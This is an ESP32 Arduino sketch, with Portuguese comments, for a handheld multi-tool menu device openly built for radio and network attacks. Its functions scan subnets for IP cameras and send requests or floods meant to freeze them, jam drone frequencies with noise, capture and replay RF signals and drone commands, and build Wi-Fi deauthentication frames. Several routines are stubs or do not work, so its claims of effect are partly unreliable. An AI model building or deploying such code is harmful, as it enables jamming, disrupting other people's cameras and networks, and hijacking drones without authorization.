#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <nRF24L01.h>
#include <RF24.h>
#include <SD.h>
#include <Preferences.h>
#include <WiFi.h>
#include <esp_wifi.h>          // ← ADICIONAR ESTA LINHA
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>

// ============== PINOS ==============
#define NRF_CE_PIN      5
#define NRF_CSN_PIN     4
#define CC1101_CSN_PIN  17
#define CC1101_GDO0_PIN 25
#define CC1101_GDO2_PIN 26
#define OLED_SDA_PIN    21
#define OLED_SCL_PIN    22
#define BTN_UP_PIN      13
#define BTN_DOWN_PIN    12
#define BTN_OK_PIN      14
#define BTN_BACK_PIN    27
#define SD_CS_PIN       15
#define SPI_SCK_PIN     18
#define SPI_MISO_PIN    19
#define SPI_MOSI_PIN    23

#define OLED_WIDTH      128
#define OLED_HEIGHT     64
#define OLED_ADDRESS    0x3C
#define SIGNAL_BUFFER_SIZE 64
#define MAX_CAMERAS     10
#define MAX_NETWORKS    20
#define MAX_BT_DEVICES  10

// ============== ENUMS ==============
enum MenuState {
    STATE_MAIN_MENU,
    STATE_CAMERA_MENU,
    STATE_CLONE_MENU,
    STATE_DRONE_MENU,
    STATE_DRONE_CONTROL,
    STATE_BT_MENU,
    STATE_WIFI_MENU,
    STATE_SETTINGS_MENU
};

enum ToolType {
    TOOL_CAMERA,
    TOOL_CLONE,
    TOOL_DRONE,
    TOOL_BLUETOOTH,
    TOOL_WIFI,
    TOOL_SETTINGS
};

enum StorageMode {
    STORAGE_MEMORY,
    STORAGE_SD_CARD
};

// ============== ESTRUTURAS ==============
struct SignalData {
    uint8_t buffer[SIGNAL_BUFFER_SIZE];
    uint8_t length;
    uint8_t channel;
    uint32_t timestamp;
    uint32_t frequency;
    ToolType tool;
};

struct IPCamera {
    char ip[16];
    char mac[18];
    char vendor[20];
    int port;
    bool isVulnerable;
};

struct WiFiNetwork {
    char ssid[32];
    uint8_t bssid[6];
    int channel;
    int rssi;
    bool encrypted;
};

struct BTDevice {
    char name[32];
    char address[18];
    int rssi;
};

// ============== VARIÁVEIS GLOBAIS ==============
Adafruit_SSD1306 display(OLED_WIDTH, OLED_HEIGHT, &Wire, -1);
RF24 nrf24(NRF_CE_PIN, NRF_CSN_PIN);
Preferences prefs;

MenuState currentState = STATE_MAIN_MENU;
MenuState previousState = STATE_MAIN_MENU;
int menuIndex = 0;
int subMenuIndex = 0;
bool inSubMenu = false;
bool inDroneControl = false;

StorageMode storageMode = STORAGE_MEMORY;
bool sdAvailable = false;

// Dados
SignalData lastSignal;
SignalData droneSignal;
IPCamera foundCameras[MAX_CAMERAS];
int cameraCount = 0;
WiFiNetwork networks[MAX_NETWORKS];
int networkCount = 0;
BTDevice btDevices[MAX_BT_DEVICES];
int btDeviceCount = 0;

// CC1101 regs simplificados
uint8_t cc1101_regs[47] = {
    0x29, 0x2E, 0x06, 0x07, 0xD3, 0x91, 0xFF, 0x04,
    0x45, 0x00, 0x00, 0x06, 0x00, 0x10, 0xB0, 0x71,
    0x83, 0x23, 0xE5, 0x3C, 0x18, 0x16, 0x6C, 0x43,
    0x68, 0x81, 0x35, 0x0F, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// ============== PROTÓTIPOS ==============
void drawMainMenu();
void drawSubMenu();
void drawDroneControlScreen();
void handleButtons();
void executeAction();
void executeDroneCommand();

void initNRF24();
void initCC1101();
void initSD();
void initDisplay();

void scanIPCameras();
void freezeCamera();
void disconnectCamera();

void scanRadio();
void copySignal();
void playSignal();

void droneJamming();
void scanDrone();
void enterDroneControl();
void exitDroneControl();

void scanWiFi();
void deauthAll();
void deauthNetwork();

void scanBluetooth();
void deauthBluetooth();
void connectBluetooth();

void setStorageMemory();
void setStorageSD();

void saveSignalStorage(SignalData* sig, ToolType tool);
bool loadSignalStorage(SignalData* sig, ToolType tool);

void cc1101_select();
void cc1101_deselect();
void cc1101_writeReg(uint8_t reg, uint8_t value);
uint8_t cc1101_readReg(uint8_t reg);
void cc1101_setFrequency(float freq);
void cc1101_setRx();
void cc1101_setTx();

// ============== SETUP ==============
void setup() {
    Serial.begin(115200);
    
    // Inicializa I2C e Display
    Wire.begin(OLED_SDA_PIN, OLED_SCL_PIN);
    initDisplay();
    
    // SPI
    SPI.begin(SPI_SCK_PIN, SPI_MISO_PIN, SPI_MOSI_PIN);
    
    // NRF24
    initNRF24();
    
    // CC1101
    initCC1101();
    
    // SD
    initSD();
    
    // Preferences
    prefs.begin("hackdevice", false);
    storageMode = (StorageMode)prefs.getInt("storageMode", 0);
    
    // Botões
    pinMode(BTN_UP_PIN, INPUT_PULLUP);
    pinMode(BTN_DOWN_PIN, INPUT_PULLUP);
    pinMode(BTN_OK_PIN, INPUT_PULLUP);
    pinMode(BTN_BACK_PIN, INPUT_PULLUP);
    
    // WiFi
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
    
    // BLE
    BLEDevice::init("ESP32-Hack");
    
    drawMainMenu();
}

void loop() {
    handleButtons();
    
    if(inDroneControl) {
        // Modo controle de drone - resposta rápida
        if(digitalRead(BTN_UP_PIN) == LOW) {
            // Frente
            uint8_t cmd[] = {0x00, 0x01, 0x00, 0x00}; // Comando genérico
            nrf24.write(cmd, 4);
            display.fillRect(54, 10, 20, 10, SSD1306_WHITE);
            display.display();
            delay(100);
            display.fillRect(54, 10, 20, 10, SSD1306_BLACK);
            display.display();
        }
        if(digitalRead(BTN_DOWN_PIN) == LOW) {
            // Trás
            uint8_t cmd[] = {0x00, 0x02, 0x00, 0x00};
            nrf24.write(cmd, 4);
            display.fillRect(54, 50, 20, 10, SSD1306_WHITE);
            display.display();
            delay(100);
            display.fillRect(54, 50, 20, 10, SSD1306_BLACK);
            display.display();
        }
        if(digitalRead(BTN_OK_PIN) == LOW) {
            // Subir / Ligar
            uint8_t cmd[] = {0x00, 0x04, 0x00, 0x00};
            nrf24.write(cmd, 4);
            display.fillRect(90, 30, 20, 10, SSD1306_WHITE);
            display.display();
            delay(100);
            display.fillRect(90, 30, 20, 10, SSD1306_BLACK);
            display.display();
        }
        if(digitalRead(BTN_BACK_PIN) == LOW) {
            // Descer / Desligar
            exitDroneControl();
            delay(300);
        }
    }
    
    delay(50);
}

// ============== INICIALIZAÇÃO ==============
void initDisplay() {
    if(!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
        Serial.println("OLED falhou");
    }
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(SSD1306_WHITE);
    display.display();
}

void initNRF24() {
    if(nrf24.begin()) {
        nrf24.setPALevel(RF24_PA_MAX);
        nrf24.setDataRate(RF24_250KBPS);
        nrf24.setAutoAck(false);
        nrf24.setChannel(0);
    }
}

void initCC1101() {
    pinMode(CC1101_CSN_PIN, OUTPUT);
    digitalWrite(CC1101_CSN_PIN, HIGH);
    delay(10);
    
    // Reset
    digitalWrite(CC1101_CSN_PIN, LOW);
    delay(10);
    digitalWrite(CC1101_CSN_PIN, HIGH);
    delay(40);
    
    // Configuração básica
    cc1101_select();
    SPI.transfer(0x30); // SRES
    cc1101_deselect();
    delay(10);
    
    // Configura frequência padrão (433MHz)
    cc1101_setFrequency(433.92);
}

void initSD() {
    pinMode(SD_CS_PIN, OUTPUT);
    digitalWrite(SD_CS_PIN, HIGH);
    if(SD.begin(SD_CS_PIN, SPI)) {
        sdAvailable = true;
    }
}

// ============== CC1101 FUNÇÕES ==============
void cc1101_select() {
    digitalWrite(CC1101_CSN_PIN, LOW);
}

void cc1101_deselect() {
    digitalWrite(CC1101_CSN_PIN, HIGH);
}

void cc1101_writeReg(uint8_t reg, uint8_t value) {
    cc1101_select();
    SPI.transfer(reg);
    SPI.transfer(value);
    cc1101_deselect();
}

uint8_t cc1101_readReg(uint8_t reg) {
    cc1101_select();
    SPI.transfer(reg | 0x80);
    uint8_t val = SPI.transfer(0);
    cc1101_deselect();
    return val;
}

void cc1101_setFrequency(float freq) {
    uint32_t freqWord = (uint32_t)(freq * 65536.0 / 26.0);
    cc1101_writeReg(0x0D, (freqWord >> 16) & 0xFF);
    cc1101_writeReg(0x0E, (freqWord >> 8) & 0xFF);
    cc1101_writeReg(0x0F, freqWord & 0xFF);
}

void cc1101_setRx() {
    cc1101_writeReg(0x36, 0x34); // SIDLE
    delay(1);
    cc1101_writeReg(0x36, 0x36); // SRX
}

void cc1101_setTx() {
    cc1101_writeReg(0x36, 0x34); // SIDLE
    delay(1);
    cc1101_writeReg(0x36, 0x35); // STX
}

// ============== DISPLAY ==============
void drawMainMenu() {
    display.clearDisplay();
    display.setTextSize(1);
    
    const char* labels[] = {"Camera", "Clone", "Drone", "BT", "WiFi", "Cfg"};
    
    int positions[6][2] = {
        {10, 5}, {54, 5}, {98, 5},
        {10, 40}, {54, 40}, {98, 40}
    };
    
    for(int i = 0; i < 6; i++) {
        int x = positions[i][0];
        int y = positions[i][1];
        
        if(i == menuIndex) {
            display.fillRect(x-2, y-2, 30, 18, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
        } else {
            display.setTextColor(SSD1306_WHITE);
        }
        
        display.setCursor(x, y+5);
        display.print(labels[i]);
    }
    
    // Status
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 56);
    display.print(storageMode == STORAGE_MEMORY ? "[MEM]" : "[SD]");
    
    display.display();
}

void drawSubMenu() {
    display.clearDisplay();
    
    const char* title;
    const char* items[3];
    int itemCount = 3;
    
    switch(currentState) {
        case STATE_CAMERA_MENU:
            title = "CAMERA IP";
            items[0] = "Congelar";
            items[1] = "Desconectar";
            items[2] = "Voltar";
            break;
        case STATE_CLONE_MENU:
            title = "CLONAGEM";
            items[0] = "Copiar/Salvar";
            items[1] = "Reproduzir";
            items[2] = "Voltar";
            break;
        case STATE_DRONE_MENU:
            title = "DRONE";
            items[0] = "Cortar Sinal";
            items[1] = "Controlar";
            items[2] = "Voltar";
            break;
        case STATE_BT_MENU:
            title = "BLUETOOTH";
            items[0] = "Desautenticar";
            items[1] = "Conectar";
            items[2] = "Voltar";
            break;
        case STATE_WIFI_MENU:
            title = "WIFI";
            items[0] = "Descon. Todos";
            items[1] = "Descon. Rede";
            items[2] = "Voltar";
            break;
        case STATE_SETTINGS_MENU:
            title = "CONFIG";
            items[0] = "Salvar Memoria";
            items[1] = "Salvar no SD";
            items[2] = "Voltar";
            break;
        default:
            return;
    }
    
    // Título
    display.fillRect(0, 0, 128, 12, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(2, 2);
    display.print(title);
    
    // Itens
    display.setTextColor(SSD1306_WHITE);
    for(int i = 0; i < itemCount; i++) {
        int y = 16 + (i * 16);
        if(i == subMenuIndex) {
            display.fillRect(0, y-1, 128, 13, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
        } else {
            display.setTextColor(SSD1306_WHITE);
        }
        display.setCursor(4, y+3);
        display.print(">");
        display.print(items[i]);
    }
    
    display.display();
}

void drawDroneControlScreen() {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    
    // Título
    display.setCursor(30, 0);
    display.print("DRONE CTRL");
    
    // Cruz de controle visual
    display.drawRect(50, 20, 28, 28, SSD1306_WHITE);   // Centro
    display.drawRect(50, 8, 28, 10, SSD1306_WHITE);      // Cima
    display.drawRect(50, 50, 28, 10, SSD1306_WHITE);     // Baixo
    display.drawRect(85, 28, 28, 12, SSD1306_WHITE);     // Direita (Subir)
    display.drawRect(15, 28, 28, 12, SSD1306_WHITE);     // Esquerda (Descer)
    
    // Labels
    display.setCursor(58, 10);
    display.print("F");
    display.setCursor(58, 52);
    display.print("T");
    display.setCursor(22, 32);
    display.print("D");
    display.setCursor(92, 32);
    display.print("S");
    
    // Status
    display.setCursor(0, 56);
    display.print("BACK: Sair");
    
    display.display();
}

// ============== BOTÕES ==============
void handleButtons() {
    static unsigned long lastDebounce = 0;
    if(millis() - lastDebounce < 200) return;
    
    if(inDroneControl) {
        // Controle de drone é tratado no loop principal
        return;
    }
    
    if(digitalRead(BTN_UP_PIN) == LOW) {
        lastDebounce = millis();
        if(inSubMenu) {
            subMenuIndex--;
            if(subMenuIndex < 0) subMenuIndex = 2;
            drawSubMenu();
        } else {
            menuIndex--;
            if(menuIndex < 0) menuIndex = 5;
            drawMainMenu();
        }
    }
    
    if(digitalRead(BTN_DOWN_PIN) == LOW) {
        lastDebounce = millis();
        if(inSubMenu) {
            subMenuIndex++;
            if(subMenuIndex > 2) subMenuIndex = 0;
            drawSubMenu();
        } else {
            menuIndex++;
            if(menuIndex > 5) menuIndex = 0;
            drawMainMenu();
        }
    }
    
    if(digitalRead(BTN_OK_PIN) == LOW) {
        lastDebounce = millis();
        if(!inSubMenu) {
            switch(menuIndex) {
                case 0: currentState = STATE_CAMERA_MENU; break;
                case 1: currentState = STATE_CLONE_MENU; break;
                case 2: currentState = STATE_DRONE_MENU; break;
                case 3: currentState = STATE_BT_MENU; break;
                case 4: currentState = STATE_WIFI_MENU; break;
                case 5: currentState = STATE_SETTINGS_MENU; break;
            }
            inSubMenu = true;
            subMenuIndex = 0;
            drawSubMenu();
        } else {
            executeAction();
        }
    }
    
    if(digitalRead(BTN_BACK_PIN) == LOW) {
        lastDebounce = millis();
        if(inSubMenu) {
            inSubMenu = false;
            drawMainMenu();
        }
    }
}

// ============== AÇÕES ==============
void executeAction() {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 28);
    
    switch(currentState) {
        case STATE_CAMERA_MENU:
            if(subMenuIndex == 0) {
                display.print("Buscando cameras...");
                display.display();
                scanIPCameras();
                freezeCamera();
            } else if(subMenuIndex == 1) {
                display.print("Desconectando...");
                display.display();
                disconnectCamera();
            } else {
                inSubMenu = false;
                drawMainMenu();
                return;
            }
            break;
            
        case STATE_CLONE_MENU:
            if(subMenuIndex == 0) {
                display.print("Escaneando RF...");
                display.display();
                scanRadio();
                copySignal();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Salvo!");
            } else if(subMenuIndex == 1) {
                display.print("Reproduzindo...");
                display.display();
                playSignal();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Enviado!");
            } else {
                inSubMenu = false;
                drawMainMenu();
                return;
            }
            break;
            
        case STATE_DRONE_MENU:
            if(subMenuIndex == 0) {
                display.print("JAMMING DRONE...");
                display.display();
                droneJamming();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Sinal cortado!");
            } else if(subMenuIndex == 1) {
                display.print("Scan drone...");
                display.display();
                scanDrone();
                enterDroneControl();
                return; // Não mostra mensagem, entra direto
            } else {
                inSubMenu = false;
                drawMainMenu();
                return;
            }
            break;
            
        case STATE_BT_MENU:
            if(subMenuIndex == 0) {
                display.print("Scan BLE...");
                display.display();
                scanBluetooth();
                deauthBluetooth();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Deauth BLE!");
            } else if(subMenuIndex == 1) {
                display.print("Conectando...");
                display.display();
                connectBluetooth();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Conectado!");
            } else {
                inSubMenu = false;
                drawMainMenu();
                return;
            }
            break;
            
        case STATE_WIFI_MENU:
            if(subMenuIndex == 0) {
                display.print("Deauth all...");
                display.display();
                deauthAll();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Todos off!");
            } else if(subMenuIndex == 1) {
                display.print("Scan WiFi...");
                display.display();
                scanWiFi();
                deauthNetwork();
                display.clearDisplay();
                display.setCursor(0, 28);
                display.print("Rede off!");
            } else {
                inSubMenu = false;
                drawMainMenu();
                return;
            }
            break;
            
        case STATE_SETTINGS_MENU:
            if(subMenuIndex == 0) {
                setStorageMemory();
                display.print("Modo: MEMORIA");
            } else if(subMenuIndex == 1) {
                setStorageSD();
                display.print("Modo: SD CARD");
            } else {
                inSubMenu = false;
                drawMainMenu();
                return;
            }
            break;
    }
    
    display.display();
    delay(1500);
    if(inSubMenu) drawSubMenu();
    else drawMainMenu();
}

// ============== CÂMERA IP ==============
void scanIPCameras() {
    cameraCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    String ipBase = gateway.toString();
    ipBase = ipBase.substring(0, ipBase.lastIndexOf('.') + 1);
    
    for(int i = 1; i < 255 && cameraCount < MAX_CAMERAS; i++) {
        String ip = ipBase + String(i);
        IPAddress target;
        target.fromString(ip);
        
        // Portas comuns de cÃ¢meras
        int ports[] = {80, 81, 8080, 8000, 554, 8899, 34567};
        
        for(int j = 0; j < 7; j++) {
            WiFiClient client;
            if(client.connect(target, ports[j], 50)) {
                client.print("GET / HTTP/1.1\r\nHost: ");
                client.print(ip);
                client.print("\r\n\r\n");
                delay(100);
                
                String response = client.readString();
                
                strcpy(foundCameras[cameraCount].ip, ip.c_str());
                foundCameras[cameraCount].port = ports[j];
                
                if(response.indexOf("Dahua") >= 0) {
                    strcpy(foundCameras[cameraCount].vendor, "Dahua");
                    foundCameras[cameraCount].isVulnerable = true;
                } else if(response.indexOf("Hikvision") >= 0) {
                    strcpy(foundCameras[cameraCount].vendor, "Hikvision");
                    foundCameras[cameraCount].isVulnerable = true;
                } else if(response.indexOf("TP-LINK") >= 0) {
                    strcpy(foundCameras[cameraCount].vendor, "TP-Link");
                    foundCameras[cameraCount].isVulnerable = true;
                } else if(response.indexOf("FOSCAM") >= 0) {
                    strcpy(foundCameras[cameraCount].vendor, "Foscam");
                    foundCameras[cameraCount].isVulnerable = true;
                } else {
                    strcpy(foundCameras[cameraCount].vendor, "IPCam");
                    foundCameras[cameraCount].isVulnerable = false;
                }
                
                cameraCount++;
                client.stop();
                break;
            }
        }
    }
}

void freezeCamera() {
    if(cameraCount == 0) return;
    
    for(int i = 0; i < cameraCount; i++) {
        if(foundCameras[i].isVulnerable) {
            WiFiClient client;
            if(client.connect(foundCameras[i].ip, foundCameras[i].port)) {
                if(strcmp(foundCameras[i].vendor, "Dahua") == 0) {
                    client.print("POST /cgi-bin/configManager.cgi?action=setConfig&VideoInputChannelMode=0 HTTP/1.1\r\n");
                    client.print("Host: ");
                    client.print(foundCameras[i].ip);
                    client.print("\r\n\r\n");
                } else if(strcmp(foundCameras[i].vendor, "Hikvision") == 0) {
                    client.print("PUT /ISAPI/Streaming/channels/101 HTTP/1.1\r\n");
                    client.print("Host: ");
                    client.print(foundCameras[i].ip);
                    client.print("\r\nContent-Length: 0\r\n\r\n");
                } else {
                    // Flood para travar
                    for(int j = 0; j < 20; j++) {
                        client.print("GET / HTTP/1.1\r\n\r\n");
                    }
                }
                client.stop();
            }
            break;
        }
    }
}

void disconnectCamera() {
    if(cameraCount == 0) return;
    
    // Deauth nas cÃ¢meras encontradas
    esp_wifi_set_promiscuous(true);
    
    for(int i = 0; i < cameraCount; i++) {
        uint8_t deauthFrame[26] = {
            0xC0, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x07, 0x00
        };
        // esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, 26, false);
        delay(100);
    }
    
    esp_wifi_set_promiscuous(false);
}
// ============== CLONAGEM RF ==============
void scanRadio() {
    // Scan em mÃºltiplas frequÃªncias
    uint8_t channels[] = {0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 70, 80, 90, 100, 110, 120};
    
    for(int c = 0; c < sizeof(channels); c++) {
        nrf24.setChannel(channels[c]);
        nrf24.startListening();
        delay(50);
        
        if(nrf24.available()) {
            lastSignal.length = nrf24.getPayloadSize();
            nrf24.read(lastSignal.buffer, lastSignal.length);
            lastSignal.channel = channels[c];
            lastSignal.timestamp = millis();
            lastSignal.tool = TOOL_CLONE;
            lastSignal.frequency = 2400 + channels[c];
            nrf24.stopListening();
            return;
        }
        nrf24.stopListening();
    }
    
    // Scan CC1101 em 433MHz
    cc1101_setRx();
    for(int i = 0; i < 100; i++) {
        if(digitalRead(CC1101_GDO0_PIN)) {
            // LÃª dados do CC1101
            lastSignal.length = 32;
            lastSignal.channel = 0;
            lastSignal.frequency = 433920;
            lastSignal.tool = TOOL_CLONE;
            break;
        }
        delay(10);
    }
}

void copySignal() {
    if(lastSignal.length > 0) {
        saveSignalStorage(&lastSignal, TOOL_CLONE);
    }
}

void playSignal() {
    if(!loadSignalStorage(&lastSignal, TOOL_CLONE)) return;
    
    // Se for 2.4GHz (NRF24)
    if(lastSignal.frequency >= 2400 && lastSignal.frequency <= 2500) {
        nrf24.setChannel(lastSignal.channel);
        nrf24.stopListening();
        nrf24.write(lastSignal.buffer, lastSignal.length);
    } 
    // Se for sub-GHz (CC1101)
    else if(lastSignal.frequency < 1000) {
        cc1101_setTx();
        // Envia via CC1101
        delay(100);
        cc1101_setRx();
    }
}

// ============== DRONE ==============
void scanDrone() {
    // FrequÃªncias comuns de drones
    uint8_t droneChannels[] = {0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55, 60, 65, 70, 75};
    
    for(int i = 0; i < sizeof(droneChannels); i++) {
        nrf24.setChannel(droneChannels[i]);
        nrf24.startListening();
        delay(100);
        
        if(nrf24.available()) {
            uint8_t buf[32];
            uint8_t len = nrf24.getPayloadSize();
            nrf24.read(buf, len);
            
            // Detecta padrÃ£o de drone (protocolos comuns)
            if(len >= 4 && (buf[0] == 0x00 || buf[0] == 0xA1 || buf[0] == 0x55)) {
                memcpy(droneSignal.buffer, buf, len);
                droneSignal.length = len;
                droneSignal.channel = droneChannels[i];
                droneSignal.frequency = 2400 + droneChannels[i];
                droneSignal.tool = TOOL_DRONE;
                saveSignalStorage(&droneSignal, TOOL_DRONE);
                nrf24.stopListening();
                return;
            }
        }
        nrf24.stopListening();
    }
}

void droneJamming() {
    // Jamming em todas as frequÃªncias de drone
    uint8_t noise[32];
    
    for(int ch = 0; ch < 125; ch += 5) {
        nrf24.setChannel(ch);
        for(int i = 0; i < 32; i++) noise[i] = random(256);
        nrf24.stopListening();
        nrf24.write(noise, 32);
    }
}

void enterDroneControl() {
    if(!loadSignalStorage(&droneSignal, TOOL_DRONE)) {
        display.clearDisplay();
        display.setCursor(0, 28);
        display.print("No drone found!");
        display.display();
        delay(1500);
        drawSubMenu();
        return;
    }
    
    inDroneControl = true;
    nrf24.setChannel(droneSignal.channel);
    nrf24.stopListening();
    drawDroneControlScreen();
}

void exitDroneControl() {
    inDroneControl = false;
    inSubMenu = true;
    drawSubMenu();
}

// ============== WIFI ==============
void scanWiFi() {
    networkCount = WiFi.scanNetworks();
    int maxNet = min(networkCount, MAX_NETWORKS);
    
    for(int i = 0; i < maxNet; i++) {
        strncpy(networks[i].ssid, WiFi.SSID(i).c_str(), 31);
        networks[i].ssid[31] = '\0';
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
        networks[i].channel = WiFi.channel(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
    }
    networkCount = maxNet;
}

void deauthAll() {
    if(networkCount == 0) return;
    
    esp_wifi_set_promiscuous(true);
    
    for(int i = 0; i < networkCount; i++) {
        uint8_t deauth[26] = {
            0xC0, 0x00, 0x00, 0x00,
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            networks[i].bssid[0], networks[i].bssid[1], networks[i].bssid[2],
            networks[i].bssid[3], networks[i].bssid[4], networks[i].bssid[5],
            networks[i].bssid[0], networks[i].bssid[1], networks[i].bssid[2],
            networks[i].bssid[3], networks[i].bssid[4], networks[i].bssid[5],
            0x00, 0x00, 0x07, 0x00
        };
        // esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
        delay(50);
    }
    
    esp_wifi_set_promiscuous(false);
}

void deauthNetwork() {
    if(networkCount == 0) return;
    // Deauth na primeira rede
    deauthAll();
}

// ============== BLUETOOTH ==============
void scanBluetooth() {
    BLEScan* pScan = BLEDevice::getScan();
    pScan->setActiveScan(true);
    pScan->start(3);
    
    btDeviceCount = 0;
    auto results = pScan->getResults();
    
    for(int i = 0; i < results.getCount() && btDeviceCount < MAX_BT_DEVICES; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);
        strncpy(btDevices[btDeviceCount].name, device.getName().c_str(), 31);
        strncpy(btDevices[btDeviceCount].address, device.getAddress().toString().c_str(), 17);
        btDevices[btDeviceCount].rssi = device.getRSSI();
        btDeviceCount++;
    }
}

void deauthBluetooth() {
    // BLE nÃ£o tem deauth tradicional, mas pode flood de pairing
}

void connectBluetooth() {
    if(btDeviceCount == 0) return;
    BLEAddress addr(btDevices[0].address);
    BLEClient* client = BLEDevice::createClient();
    client->connect(addr);
}

// ============== CONFIGURAÃ‡Ã•ES ==============
void setStorageMemory() {
    storageMode = STORAGE_MEMORY;
    prefs.putInt("storageMode", 0);
}

void setStorageSD() {
    storageMode = STORAGE_SD_CARD;
    prefs.putInt("storageMode", 1);
}

void saveSignalStorage(SignalData* sig, ToolType tool) {
    if(storageMode == STORAGE_MEMORY) {
        const char* keys[] = {"cam_sig", "clone_sig", "drone_sig", "bt_sig", "wifi_sig"};
        prefs.putBytes(keys[tool], sig, sizeof(SignalData));
    } else if(sdAvailable) {
        const char* files[] = {"/cam.sig", "/clone.sig", "/drone.sig", "/bt.sig", "/wifi.sig"};
        File f = SD.open(files[tool], FILE_WRITE);
        if(f) {
            f.write((uint8_t*)sig, sizeof(SignalData));
            f.close();
        }
    }
}

bool loadSignalStorage(SignalData* sig, ToolType tool) {
    if(storageMode == STORAGE_MEMORY) {
        const char* keys[] = {"cam_sig", "clone_sig", "drone_sig", "bt_sig", "wifi_sig"};
        size_t len = prefs.getBytes(keys[tool], sig, sizeof(SignalData));
        return len == sizeof(SignalData);
    } else if(sdAvailable) {
        const char* files[] = {"/cam.sig", "/clone.sig", "/drone.sig", "/bt.sig", "/wifi.sig"};
        File f = SD.open(files[tool], FILE_READ);
        if(f) {
            f.read((uint8_t*)sig, sizeof(SignalData));
            f.close();
            return true;
        }
    }
    return false;
}
